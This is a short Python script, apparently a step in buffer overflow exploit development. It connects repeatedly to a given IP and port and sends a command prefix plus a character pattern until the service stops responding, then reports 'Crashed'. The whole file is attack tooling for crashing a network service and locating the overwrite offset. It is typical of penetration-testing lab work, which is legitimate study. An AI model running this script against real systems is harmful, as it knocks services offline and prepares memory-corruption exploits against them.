#!/usr/bin/env python3

import socket, time, sys

if(len(sys.argv) < 5):
  print("Usage: ./finding_offset.py IP Port prefix chars")
  sys.exit(1)

ip = str(sys.argv[1])
port = int(sys.argv[2])
prefix = str(sys.argv[3]) + " "
chars = str(sys.argv[4])
timeout = 5
string = prefix + chars
while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Crashed")
    sys.exit(0)
		
